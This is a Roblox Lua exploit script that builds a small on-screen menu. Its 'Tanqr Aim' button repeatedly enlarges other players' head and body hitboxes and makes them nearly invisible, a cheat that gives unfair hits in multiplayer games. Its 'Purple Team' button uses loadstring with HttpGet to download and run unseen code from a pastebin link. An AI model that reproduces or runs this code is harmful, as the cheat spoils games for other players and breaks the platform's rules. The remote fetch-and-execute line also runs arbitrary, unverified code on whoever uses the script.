B--[[
    Githubissues.gg | Better than you
    https://pastebin.com/vZJSssLm
]]
-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Aimlock = Instance.new("Frame")
local TANQRSCRIPT = Instance.new("TextLabel")
local TANQRAIM = Instance.new("TextButton")
local PurpleTeam = Instance.new("TextButton")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")

-- Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Aimlock.Name = "Aimlock"
Aimlock.Parent = ScreenGui
Aimlock.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Aimlock.Position = UDim2.new(0.034, 0, 0.064, 0)
Aimlock.Size = UDim2.new(0, 368, 0, 263)

TANQRSCRIPT.Name = "TANQR SCRIPT"
TANQRSCRIPT.Parent = Aimlock
TANQRSCRIPT.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TANQRSCRIPT.BorderColor3 = Color3.fromRGB(27, 42, 53)
TANQRSCRIPT.Position = UDim2.new(0, 0, 0, 0)
TANQRSCRIPT.Size = UDim2.new(0, 362, 0, 50)
TANQRSCRIPT.Font = Enum.Font.Bangers
TANQRSCRIPT.Text = "Tanqr Script"
TANQRSCRIPT.TextColor3 = Color3.fromRGB(85, 255, 255)
TANQRSCRIPT.TextScaled = true
TANQRSCRIPT.TextSize = 14.000
TANQRSCRIPT.TextWrapped = true

TANQRAIM.Name = "TANQR AIM"
TANQRAIM.Parent = Aimlock
TANQRAIM.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TANQRAIM.Position = UDim2.new(0.022, 0, 0.280, 0)
TANQRAIM.Size = UDim2.new(0, 162, 0, 46)
TANQRAIM.Font = Enum.Font.Bangers
TANQRAIM.Text = "Tanqr Aim"
TANQRAIM.TextColor3 = Color3.fromRGB(85, 255, 255)
TANQRAIM.TextScaled = true
TANQRAIM.TextSize = 14.000
TANQRAIM.TextWrapped = true
TANQRAIM.MouseButton1Click:Connect(function()
    local players = game:GetService("Players")
    local localPlayer = players.LocalPlayer

    coroutine.wrap(function()
        while wait(1) do
            for _, player in ipairs(players:GetPlayers()) do
                if player ~= localPlayer and player.Character then
                    local character = player.Character

                    local function modifyPart(partName)
                        local part = character:FindFirstChild(partName)
                        if part then
                            part.CanCollide = false
                            part.Transparency = 0.9
                            part.Size = Vector3.new(13, 13, 13)
                        end
                    end

                    modifyPart("RightUpperLeg")
                    modifyPart("LeftUpperLeg")
                    modifyPart("Head")
                    modifyPart("HumanoidRootPart")
                end
            end
        end
    end)()
end)

PurpleTeam.Name = "Purple Team"
PurpleTeam.Parent = Aimlock
PurpleTeam.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
PurpleTeam.Position = UDim2.new(0.550, 0, 0.280, 0)
PurpleTeam.Size = UDim2.new(0, 165, 0, 46)
PurpleTeam.Font = Enum.Font.SciFi
PurpleTeam.Text = "Purple Team (Broken)"
PurpleTeam.TextColor3 = Color3.fromRGB(85, 255, 255)
PurpleTeam.TextScaled = true
PurpleTeam.TextSize = 14.000
PurpleTeam.TextWrapped = true
PurpleTeam.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet('https://pastebin.com/vZJSssLm', true))()
end)

ImageLabel.Parent = Aimlock
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.Position = UDim2.new(0.399, 0, 0.525, 0)
ImageLabel.Size = UDim2.new(0, 74, 0, 60)
ImageLabel.Image = "http://www.roblox.com/asset/?id=4761224815"

TextLabel.Parent = Aimlock
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.Position = UDim2.new(0, 0, 0.808, 0)
TextLabel.Size = UDim2.new(0, 368, 0, 50)
TextLabel.Font = Enum.Font.Bangers
TextLabel.Text = "Script By luki.#8773 & Modified in 2024 by shieldchess"
TextLabel.TextColor3 = Color3.fromRGB(85, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

-- Scripts:

local function makeFrameDraggable(frame)
    frame.Draggable = true
    frame.Active = true
    frame.Selectable = true
end

makeFrameDraggable(Aimlock)

print("githubissues.gg / Sodium | better than you")
